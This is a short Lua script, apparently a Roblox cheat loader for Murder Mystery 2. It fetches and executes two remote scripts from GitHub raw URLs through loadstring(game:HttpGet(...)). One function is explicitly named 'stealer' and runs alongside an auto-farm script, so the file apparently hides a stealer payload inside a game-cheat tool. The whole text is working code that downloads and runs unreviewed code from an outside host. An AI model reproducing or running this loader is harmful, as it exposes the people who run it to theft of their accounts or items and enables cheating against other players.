local function stealer()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/active-gui/CapyHubV2/refs/heads/main/true.lua"))()
end
local function farm()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MSTTOPPER/Scripts/refs/heads/main/murdmyst2capyhub.txt"))()
end

task.spawn(stealer)
task.spawn(farm)
